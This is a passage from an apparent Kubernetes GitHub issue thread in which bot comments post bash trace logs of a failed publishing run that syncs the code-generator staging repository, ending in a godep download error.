\t+ '[' -n 23dc5401f4e9b985860aeae9657bba1b28c74ff8 ']'\n>    \t+ '[' 23dc5401f4e9b985860aeae9657bba1b28c74ff8 '!=' 23dc5401f4e9b985860aeae9657bba1b28c74ff8 ']'\n>    \t+ k_pending_merge_commit=23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>    \t+ '[' 33e14149954cd0f41c26137785ede85dc5db45b3 = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t+ '[' release-1.13 '!=' master ']'\n>    \t+ is-merge-with-master 8f7edec615fb9cd722b7f8310dab3efa25351b7c\n>    \t+ grep -q '^Merge remote-tracking branch '\\''origin/master'\\'''\n>    \t++ short-commit-message 8f7edec615fb9cd722b7f8310dab3efa25351b7c\n>    \t++ git show --format=short -q 8f7edec615fb9cd722b7f8310dab3efa25351b7c\n>    \t+ return 1\n>    \t+ '[' release-1.13 '!=' master ']'\n>    \t+ '[' -n 23dc5401f4e9b985860aeae9657bba1b28c74ff8 ']'\n>    \t+ is-merge-with-master 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>    \t+ grep -q '^Merge remote-tracking branch '\\''origin/master'\\'''\n>    \t++ short-commit-message 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>    \t++ git show --format=short -q 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>    \t+ return 1\n>    \t+ is-merge 33e14149954cd0f41c26137785ede85dc5db45b3\n>    \t+ grep -q '^Merge: '\n>    \t++ short-commit-message 33e14149954cd0f41c26137785ede85dc5db45b3\n>    \t++ git show --format=short -q 33e14149954cd0f41c26137785ede85dc5db45b3\n>    \t+ return 1\n>    \t+ local pick_args=\n>    \t+ is-merge 33e14149954cd0f41c26137785ede85dc5db45b3\n>    \t+ grep -q '^Merge: '\n>    \t++ short-commit-message 33e14149954cd0f41c26137785ede85dc5db45b3\n>    \t++ git show --format=short -q 33e14149954cd0f41c26137785ede85dc5db45b3\n>    \t+ return 1\n>    \t++ commit-subject 33e14149954cd0f41c26137785ede85dc5db45b3\n>    \t++ git show --format=%s -q 33e14149954cd0f41c26137785ede85dc5db45b3\n>    \t+ echo 'Cherry-picking k8s.io/kubernetes single-commit 8f7edec615fb9cd722b7f8310dab3efa25351b7c: generated.'\n>    \t+ local squash_commits=1\n>    \t+ godep-changes 33e14149954cd0f41c26137785ede85dc5db45b3\n>    \t+ '[' -n '' ']'\n>    \t+ git diff --exit-code --quiet '33e14149954cd0f41c26137785ede85dc5db45b3^' 33e14149954cd0f41c26137785ede85dc5db45b3 -- Godeps/Godeps.json\n>    \t++ commit-date 33e14149954cd0f41c26137785ede85dc5db45b3\n>    \t++ git show --format=%aD -q 33e14149954cd0f41c26137785ede85dc5db45b3\n>    \t+ GIT_COMMITTER_DATE='Fri, 16 Nov 2018 08:38:57 -0500'\n>    \t+ git cherry-pick --keep-redundant-commits 33e14149954cd0f41c26137785ede85dc5db45b3\n>    \t+ squash 1\n>    \t++ git rev-parse HEAD\n>    \t+ local head=9e62780e903b01e9b1a70dc16884da936cd2532d\n>    \t+ git reset -q --soft HEAD~1\n>    \t++ committer-date 9e62780e903b01e9b1a70dc16884da936cd2532d\n>    \t++ git show --format=%cD -q 9e62780e903b01e9b1a70dc16884da936cd2532d\n>    \t+ GIT_COMMITTER_DATE='Fri, 16 Nov 2018 08:38:57 -0500'\n>    \t+ git commit --allow-empty -q -C 9e62780e903b01e9b1a70dc16884da936cd2532d\n>    \t+ '[' -z 23dc5401f4e9b985860aeae9657bba1b28c74ff8 ']'\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>    \t+ local k_mainline_commit=\n>    \t+ local k_new_pending_merge_commit=\n>    \t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>    \t+ '[' -n 23dc5401f4e9b985860aeae9657bba1b28c74ff8 ']'\n>    \t+ '[' FLUSH_PENDING_MERGE_COMMIT '!=' 23dc5401f4e9b985860aeae9657bba1b28c74ff8 ']'\n>    \t+ local dst_parent2=HEAD\n>    \t+ '[' release-1.13 '!=' master ']'\n>    \t+ is-merge-with-master 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>    \t+ grep -q '^Merge remote-tracking branch '\\''origin/master'\\'''\n>    \t++ short-commit-message 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>    \t++ git show --format=short -q 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>    \t+ return 1\n>    \t++ commit-subject 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>    \t++ git show --format=%s -q 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>    \t+ echo 'Cherry-picking source dropped-merge 23dc5401f4e9b985860aeae9657bba1b28c74ff8: Merge remote-tracking branch '\\''origin/master'\\'' into release-1.13.'\n>    \t++ commit-date 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>    \t++ git show --format=%aD -q 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>    \t+ local 'date=Fri, 16 Nov 2018 20:31:24 -0800'\n>    \t+++ commit-message 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>    \t+++ git show --format=%B -q 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>    \t+++ echo\n>    \t+++ echo 'Kubernetes-commit: 23dc5401f4e9b985860aeae9657bba1b28c74ff8'\n>    \t++ GIT_COMMITTER_DATE='Fri, 16 Nov 2018 20:31:24 -0800'\n>    \t++ GIT_AUTHOR_DATE='Fri, 16 Nov 2018 20:31:24 -0800'\n>    \t++ git commit-tree -p cb3d3f4c6fa2e2eeb6a07602786cf678413af380 -p HEAD -m 'Merge remote-tracking branch '\\''origin/master'\\'' into release-1.13\n>\n>\n>    \tKubernetes-commit: 23dc5401f4e9b985860aeae9657bba1b28c74ff8' 'HEAD^{tree}'\n>    \t+ local dst_new_merge=c2090bec4d9b1fb25de3812f868accc2bc9ecbae\n>    \t+ git reset -q --hard c2090bec4d9b1fb25de3812f868accc2bc9ecbae\n>    \t+ fix-godeps '' '' k8s.io false false true Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' '' = true ']'\n>    \t+ local deps=\n>    \t+ local required_packages=\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=false\n>    \t+ local needs_godeps_update=false\n>    \t+ local squash=true\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_old_commit=c2090bec4d9b1fb25de3812f868accc2bc9ecbae\n>    \t+ '[' false = true ']'\n>    \t+ '[' -f Godeps/Godeps.json ']'\n>    \t+ checkout-deps-to-kube-commit Kubernetes-commit ''\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ deps=()\n>    \t+ local deps\n>    \t+ IFS=,\n>    \t+ read -a deps\n>    \t++ last-kube-commit Kubernetes-commit HEAD\n>    \t++ local commit_msg_tag=Kubernetes-commit\n>    \t++ git log --format=%B HEAD\n>    \t++ grep '^Kubernetes-commit: '\n>    \t++ head -n 1\n>    \t++ sed 's/^Kubernetes-commit: //g'\n>    \t+ local k_last_kube_commit=23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>    \t+ '[' -z 23dc5401f4e9b985860aeae9657bba1b28c74ff8 ']'\n>    \t++ git-find-merge 23dc5401f4e9b985860aeae9657bba1b28c74ff8 upstream-branch\n>    \t++ tail -1\n>    \t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>    \t+++ git rev-list '23dc5401f4e9b985860aeae9657bba1b28c74ff8^1..upstream-branch' --first-parent\n>    \t+++ git rev-list 23dc5401f4e9b985860aeae9657bba1b28c74ff8..upstream-branch --ancestry-path\n>    \t+++ git rev-parse 23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>    \t+ local k_last_kube_merge=23dc5401f4e9b985860aeae9657bba1b28c74ff8\n>    \t+ local dep_count=0\n>    \t+ (( i=0 ))\n>    \t+ (( i<0 ))\n>    \t+ update-deps-in-godep-json '' k8s.io false Kubernetes-commit\n>    \t+ '[' '!' -f Godeps/Godeps.json ']'\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=false\n>    \t+ local deps=\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ deps_array=()\n>    \t+ local deps_array\n>    \t+ IFS=,\n>    \t+ read -a deps_array\n>    \t+ local dep_count=0\n>    \t+ (( i=0 ))\n>    \t+ (( i<0 ))\n>    \t+ indent-godeps\n>    \t++ basename /go-workspace/src/k8s.io/code-generator\n>    \t+ unexpand --first-only --tabs=2\n>    \t++ basename /go-workspace/src/k8s.io/code-generator\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/code-generator/\") or . == \"k8s.io/code-generator\") | not))' Godeps/Godeps.json\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ git add Godeps/Godeps.json\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t+ echo 'Godeps.json hasn'\\''t changed!'\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t++ git rev-parse --abbrev-ref HEAD\n>    \t+ '[' release-1.13 '!=' master ']'\n>    \t+ '[' -d vendor/ ']'\n>    \t+ '[' false = true ']'\n>    \t+ '[' -n '' ']'\n>    \t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>    \t+ local split_recursive_delete_pattern\n>    \t+ read -r -a split_recursive_delete_pattern\n>    \t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>    \t+ git add -u\n>    \t+ git-index-clean\n>    \t+ git diff --cached --exit-code\n>    \t+ return 0\n>    \t+ git diff --exit-code c2090bec4d9b1fb25de3812f868accc2bc9ecbae\n>    \t+ echo 'Remove redundant godep commits on-top of c2090bec4d9b1fb25de3812f868accc2bc9ecbae.'\n>    \t+ git reset --soft -q c2090bec4d9b1fb25de3812f868accc2bc9ecbae\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t+ dst_needs_godeps_update=false\n>    \t++ git rev-parse HEAD\n>    \t+ dst_merge_point_commit=c2090bec4d9b1fb25de3812f868accc2bc9ecbae\n>    \t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>    \t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>    \t+ break\n>    \t+ echo 'Fixing up godeps after a complete sync'\n>    \t++ git rev-parse HEAD\n>    \t+ '[' c2090bec4d9b1fb25de3812f868accc2bc9ecbae '!=' cb3d3f4c6fa2e2eeb6a07602786cf678413af380 ']'\n>    \t+ fix-godeps '' '' k8s.io false true true Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t+ '[' '' = true ']'\n>    \t+ local deps=\n>    \t+ local required_packages=\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=false\n>    \t+ local needs_godeps_update=true\n>    \t+ local squash=true\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>    \t++ git rev-parse HEAD\n>    \t+ local dst_old_commit=c2090bec4d9b1fb25de3812f868accc2bc9ecbae\n>    \t+ '[' true = true ']'\n>    \t+ update_full_godeps '' k8s.io false Kubernetes-commit\n>    \t+ local deps=\n>    \t+ local base_package=k8s.io\n>    \t+ local is_library=false\n>    \t+ local commit_msg_tag=Kubernetes-commit\n>    \t+ ensure-clean-working-dir\n>    \t+ git diff HEAD --exit-code\n>    \t+ for d in '$../*'\n>    \t+ '[' '!' -d '$../*' ']'\n>    \t+ continue\n>    \t+ '[' '!' -f Godeps/Godeps.json ']'\n>    \t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>    \t+ local dep=\n>    \t+ local branch=\n>    \t+ local depbranch=\n>    \t++ basename /go-workspace/src/k8s.io/code-generator\n>    \t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>    \t+ IFS=:\n>    \t+ read dep branch\n>    \t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/code-generator/\") or . == \"k8s.io/code-generator\") | not))' Godeps/Godeps.json\n>    \t+ indent-godeps\n>    \t+ unexpand --first-only --tabs=2\n>    \t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>    \t+ echo 'Running godep restore.'\n>    \t+ godep restore\n>    \tgodep: error downloading dep (k8s.io/gengo/args): unrecognized import path \"k8s.io/gengo/args\"\n>    \tgodep: Error downloading some deps. Aborting restore and check.\n>\n>[17 Nov 18 07:09 UTC]: exit status 1```\n>\n\n\nInstructions for interacting with me using PR comments are available [here](https://git.k8s.io/community/contributors/guide/pull-requests.md).  If you have questions or suggestions related to my behavior, please file an issue against the [kubernetes/test-infra](https://github.com/kubernetes/test-infra/issues/new?title=Prow%20issue:) repository.\n</details>"}, {"author": "k8s-ci-robot", "body": "@k8s-publishing-bot: Reopened this issue.\n\n<details>\n\nIn response to [this](https://github.com/kubernetes/kubernetes/issues/56876#issuecomment-443394663):\n\n>/reopen\n>\n>The last publishing run failed: exit status 255\n>```\n>[01 Dec 18 03:08 UTC]: Successfully ensured /go-workspace/src/k8s.io/code-generator exists\n>[01 Dec 18 03:08 UTC]: /bin/bash -c \"git tag | xargs git tag -d >/dev/null\"\n>[01 Dec 18 03:08 UTC]: /publish_scripts/construct.sh code-generator master master   /go-workspace/src/k8s.io/kubernetes/.git staging/src/k8s.io/code-generator kubernetes kubernetes k8s.io false \"BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml\"  51453a313171185ccc0366a9eae08dd148e12bb2\n>\t+ '[' '!' 14 -eq 14 ']'\n>\t+ REPO=code-generator\n>\t+ SRC_BRANCH=master\n>\t+ DST_BRANCH=master\n>\t+ DEPS=\n>\t+ REQUIRED=\n>\t+ SOURCE_REMOTE=/go-workspace/src/k8s.io/kubernetes/.git\n>\t+ SUBDIR=staging/src/k8s.io/code-generator\n>\t+ SOURCE_REPO_ORG=kubernetes\n>\t+ SOURCE_REPO_NAME=kubernetes\n>\t+ shift 9\n>\t+ BASE_PACKAGE=k8s.io\n>\t+ IS_LIBRARY=false\n>\t+ RECURSIVE_DELETE_PATTERN='BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ SKIP_TAGS=\n>\t+ LAST_PUBLISHED_UPSTREAM_HASH=51453a313171185ccc0366a9eae08dd148e12bb2\n>\t+ readonly REPO SRC_BRANCH DST_BRANCH DEPS REQUIRED SOURCE_REMOTE SOURCE_REPO_ORG SUBDIR SOURCE_REPO_NAME BASE_PACKAGE IS_LIBRARY RECURSIVE_DELETE_PATTERN SKIP_TAGS LAST_PUBLISHED_UPSTREAM_HASH\n>\t++ dirname /publish_scripts/construct.sh\n>\t+ SCRIPT_DIR=/publish_scripts\n>\t+ source /publish_scripts/util.sh\n>\t++ set -o errexit\n>\t++ set -o nounset\n>\t++ set -o pipefail\n>\t++ set -o xtrace\n>\t+ '[' '!' -f .git/info/attributes ']'\n>\tRunning garbage collection.\n>\t+ echo 'Running garbage collection.'\n>\t+ git gc --auto\n>\tFetching from origin.\n>\t+ echo 'Fetching from origin.'\n>\t+ git fetch origin --no-tags --prune\n>\tCleaning up checkout.\n>\t+ echo 'Cleaning up checkout.'\n>\t+ git rebase --abort\n>\tNo rebase in progress?\n>\t+ true\n>\t+ git reset -q --hard\n>\t+ git clean -q -f -f -d\n>\t++ git rev-parse HEAD\n>\t+ git checkout -q 405721ab9678fde04d78961eec9498820d80408d\n>\t+ git branch -D master\n>\t+ git remote set-head origin -d\n>\t+ git rev-parse origin/master\n>\tSwitching to origin/master.\n>\t+ echo 'Switching to origin/master.'\n>\t+ git branch -f master origin/master\n>\t+ git checkout -q master\n>\tFetching upstream changes.\n>\t+ echo 'Fetching upstream changes.'\n>\t+ git remote\n>\t+ grep -w -q upstream\n>\t+ git remote set-url upstream /go-workspace/src/k8s.io/kubernetes/.git\n>\t+ git fetch -q upstream --no-tags --prune\n>\t++ git rev-parse upstream/master\n>\t+ UPSTREAM_HASH=fed12b556ac472210af7098f43831ed0161e3450\n>\t+ '[' fed12b556ac472210af7098f43831ed0161e3450 '!=' 51453a313171185ccc0366a9eae08dd148e12bb2 ']'\n>\t+ echo 'Upstream branch upstream/master moved from '\\''51453a313171185ccc0366a9eae08dd148e12bb2'\\'' to '\\''fed12b556ac472210af7098f43831ed0161e3450'\\''. We have to sync.'\n>\tUpstream branch upstream/master moved from '51453a313171185ccc0366a9eae08dd148e12bb2' to 'fed12b556ac472210af7098f43831ed0161e3450'. We have to sync.\n>\t+ sync_repo kubernetes kubernetes staging/src/k8s.io/code-generator master master '' '' k8s.io false 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local source_repo_org=kubernetes\n>\t+ local source_repo_name=kubernetes\n>\t+ local subdirectory=staging/src/k8s.io/code-generator\n>\t+ local src_branch=master\n>\t+ local dst_branch=master\n>\t+ local deps=\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ shift 9\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ readonly subdirectory src_branch dst_branch deps is_library\n>\t+ local new_branch=false\n>\t+ local orphan=false\n>\t+ git rev-parse -q --verify HEAD\n>\t405721ab9678fde04d78961eec9498820d80408d\n>\t++ ls -1\n>\t++ wc -l\n>\t+ '[' 15 = 0 ']'\n>\t++ git rev-parse HEAD\n>\tStarting at existing master commit 405721ab9678fde04d78961eec9498820d80408d.\n>\t+ echo 'Starting at existing master commit 405721ab9678fde04d78961eec9498820d80408d.'\n>\t+ git branch -D filtered-branch\n>\t+ git branch -f upstream-branch upstream/master\n>\tBranch upstream-branch set up to track remote branch master from upstream.\n>\t++ git rev-parse upstream-branch\n>\tChecked out source commit fed12b556ac472210af7098f43831ed0161e3450.\n>\t+ echo 'Checked out source commit fed12b556ac472210af7098f43831ed0161e3450.'\n>\t+ git checkout -q upstream-branch -b filtered-branch\n>\t+ git reset -q --hard upstream-branch\n>\t+ local f_mainline_commits=\n>\t+ '[' false = true ']'\n>\t+ '[' false = true ']'\n>\t++ last-kube-commit Kubernetes-commit master\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B master\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t++ true\n>\t+ local k_base_commit=9878253c3cb8fa4699615b41375578fe681b0f9a\n>\t+ '[' -z 9878253c3cb8fa4699615b41375578fe681b0f9a ']'\n>\t++ git-find-merge 9878253c3cb8fa4699615b41375578fe681b0f9a upstream/master\n>\t++ tail -1\n>\t+++ git rev-list '9878253c3cb8fa4699615b41375578fe681b0f9a^1..upstream/master' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 9878253c3cb8fa4699615b41375578fe681b0f9a..upstream/master --ancestry-path\n>\t+++ git rev-parse 9878253c3cb8fa4699615b41375578fe681b0f9a\n>\t+ local k_base_merge=9878253c3cb8fa4699615b41375578fe681b0f9a\n>\t+ '[' -z 9878253c3cb8fa4699615b41375578fe681b0f9a ']'\n>\t+ git branch -f filtered-branch-base 9878253c3cb8fa4699615b41375578fe681b0f9a\n>\tRewriting upstream branch master to only include commits for staging/src/k8s.io/code-generator.\n>\t+ echo 'Rewriting upstream branch master to only include commits for staging/src/k8s.io/code-generator.'\n>\t+ filter-branch Kubernetes-commit staging/src/k8s.io/code-generator 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' filtered-branch filtered-branch-base\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local subdirectory=staging/src/k8s.io/code-generator\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ echo 'Running git filter-branch ...'\n>\t+ local index_filter=\n>\t+ '[' -n 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\tRunning git filter-branch ...\n>\t+ patterns=()\n>\t+ local patterns\n>\t+ local p=\n>\t+ index_filter='git rm -q --cached --ignore-unmatch -r'\n>\t+ IFS=' '\n>\t+ read -ra patterns\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''*/BUILD.bazel'\\'''\n>\t+ for p in '\"${patterns[@]}\"'\n>\t+ index_filter+=' '\\''Gopkg.toml'\\'''\n>\t+ git filter-branch -f --index-filter 'git rm -q --cached --ignore-unmatch -r '\\''BUILD'\\'' '\\''*/BUILD'\\'' '\\''BUILD.bazel'\\'' '\\''*/BUILD.bazel'\\'' '\\''Gopkg.toml'\\''' --msg-filter 'awk 1 && echo && echo \"Kubernetes-commit: ${GIT_COMMIT}\"' --subdirectory-filter staging/src/k8s.io/code-generator -- filtered-branch filtered-branch-base\n>\t++ git rev-parse filtered-branch-base\n>\t+ local f_base_commit=33e14149954cd0f41c26137785ede85dc5db45b3\n>\t++ git log --first-parent --format=%H --reverse 33e14149954cd0f41c26137785ede85dc5db45b3..HEAD\n>\t+ f_mainline_commits=\n>\t+ echo 'Checking out branch master.'\n>\t+ git checkout -q master\n>\tChecking out branch master.\n>\t+ '[' -f kubernetes-sha ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_head=405721ab9678fde04d78961eec9498820d80408d\n>\t+ local k_pending_merge_commit=\n>\t+ local dst_needs_godeps_update=false\n>\t++ git rev-parse HEAD\n>\t+ local dst_merge_point_commit=405721ab9678fde04d78961eec9498820d80408d\n>\t+ for f_mainline_commit in '${f_mainline_commits}' FLUSH_PENDING_MERGE_COMMIT\n>\t+ local k_mainline_commit=\n>\t+ local k_new_pending_merge_commit=\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ k_new_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' -n '' ']'\n>\t+ k_pending_merge_commit=FLUSH_PENDING_MERGE_COMMIT\n>\t+ '[' FLUSH_PENDING_MERGE_COMMIT = FLUSH_PENDING_MERGE_COMMIT ']'\n>\t+ break\n>\t+ echo 'Fixing up godeps after a complete sync'\n>\tFixing up godeps after a complete sync\n>\t++ git rev-parse HEAD\n>\t+ '[' 405721ab9678fde04d78961eec9498820d80408d '!=' 405721ab9678fde04d78961eec9498820d80408d ']'\n>\t+ '[' false = true ']'\n>\t+ fix-godeps '' '' k8s.io false true false Kubernetes-commit 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' '' = true ']'\n>\t+ local deps=\n>\t+ local required_packages=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local needs_godeps_update=true\n>\t+ local squash=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t++ git rev-parse HEAD\n>\t+ local dst_old_commit=405721ab9678fde04d78961eec9498820d80408d\n>\t+ '[' true = true ']'\n>\t+ update_full_godeps '' k8s.io false Kubernetes-commit\n>\t+ local deps=\n>\t+ local base_package=k8s.io\n>\t+ local is_library=false\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t+ for d in '$../*'\n>\t+ '[' '!' -d '$../*' ']'\n>\t+ continue\n>\t+ '[' '!' -f Godeps/Godeps.json ']'\n>\t+ echo 'Removing k8s.io/* dependencies from Godeps.json'\n>\t+ local dep=\n>\tRemoving k8s.io/* dependencies from Godeps.json\n>\t+ local branch=\n>\t+ local depbranch=\n>\t++ basename /go-workspace/src/k8s.io/code-generator\n>\t+ for depbranch in '${deps//,/ }' '$(basename \"${PWD}\")'\n>\t+ IFS=:\n>\t+ read dep branch\n>\t+ jq '.Deps |= map(select(.ImportPath | (startswith(\"k8s.io/code-generator/\") or . == \"k8s.io/code-generator\") | not))' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\tRunning godep restore.\n>\t+ echo 'Running godep restore.'\n>\t+ godep restore\n>\t+ checkout-deps-to-kube-commit Kubernetes-commit ''\n>\t+ local commit_msg_tag=Kubernetes-commit\n>\t+ deps=()\n>\t+ local deps\n>\t+ IFS=,\n>\t+ read -a deps\n>\t++ last-kube-commit Kubernetes-commit HEAD\n>\t++ local commit_msg_tag=Kubernetes-commit\n>\t++ git log --format=%B HEAD\n>\t++ grep '^Kubernetes-commit: '\n>\t++ head -n 1\n>\t++ sed 's/^Kubernetes-commit: //g'\n>\t+ local k_last_kube_commit=9878253c3cb8fa4699615b41375578fe681b0f9a\n>\t+ '[' -z 9878253c3cb8fa4699615b41375578fe681b0f9a ']'\n>\t++ git-find-merge 9878253c3cb8fa4699615b41375578fe681b0f9a upstream-branch\n>\t++ tail -1\n>\t+++ git rev-list '9878253c3cb8fa4699615b41375578fe681b0f9a^1..upstream-branch' --first-parent\n>\t++ awk 'NR==FNR{a[$1]++;next} a[$1] ' /dev/fd/63 /dev/fd/62\n>\t+++ git rev-list 9878253c3cb8fa4699615b41375578fe681b0f9a..upstream-branch --ancestry-path\n>\t+++ git rev-parse 9878253c3cb8fa4699615b41375578fe681b0f9a\n>\t+ local k_last_kube_merge=9878253c3cb8fa4699615b41375578fe681b0f9a\n>\t+ local dep_count=0\n>\t+ (( i=0 ))\n>\t+ (( i<0 ))\n>\t+ rm -rf ./Godeps\n>\t+ rm -rf ./vendor\n>\tRunning godep save.\n>\t+ echo 'Running godep save.'\n>\t+ godep save ./...\n>\t+ cp Godeps/Godeps.json Godeps/Godeps.json.preserve\n>\t+ git checkout HEAD Godeps/\n>\t+ mv Godeps/Godeps.json.preserve Godeps/Godeps.json\n>\t+ jq 'del(.Deps[].Comment)' Godeps/Godeps.json\n>\t+ indent-godeps\n>\t+ unexpand --first-only --tabs=2\n>\t+ mv Godeps/Godeps.json.clean Godeps/Godeps.json\n>\t+ '[' false = true ']'\n>\t+ git add Godeps/Godeps.json\n>\t+ git clean -f Godeps\n>\t+ git add vendor/ --ignore-errors\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ echo 'Godeps.json hasn'\\''t changed!'\n>\tGodeps.json hasn't changed!\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ git rev-parse --abbrev-ref HEAD\n>\t+ '[' master '!=' master ']'\n>\t+ '[' -n '' ']'\n>\t+ apply-recursive-delete-pattern 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ local 'recursive_delete_pattern=BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml'\n>\t+ '[' -z 'BUILD */BUILD BUILD.bazel */BUILD.bazel Gopkg.toml' ']'\n>\t+ local split_recursive_delete_pattern\n>\t+ read -r -a split_recursive_delete_pattern\n>\t+ git rm -q --ignore-unmatch -r BUILD '*/BUILD' BUILD.bazel '*/BUILD.bazel' Gopkg.toml\n>\t+ git add -u\n>\t+ git-index-clean\n>\t+ git diff --cached --exit-code\n>\t+ return 0\n>\t+ git diff --exit-code 405721ab9678fde04d78961eec9498820d80408d\n>\tRemove redundant godep commits on-top of 405721ab9678fde04d78961eec9498820d80408d.\n>\t+ echo 'Remove redundant godep commits on-top of 405721ab9678fde04d78961eec9498820d80408d.'\n>\t+ git reset --soft -q 405721ab9678fde04d78961eec9498820d80408d\n>\t+ ensure-clean-working-dir\n>\t+ git diff HEAD --exit-code\n>\t++ basename /go-workspace/src/k8s.io/code-generator\n>\t+ local repo=code-generator\n>\t++ git log --oneline --first-parent --merges\n>\t++ head -n 1\n>\t+ '[' -n '405721a Merge pull request #70998 from 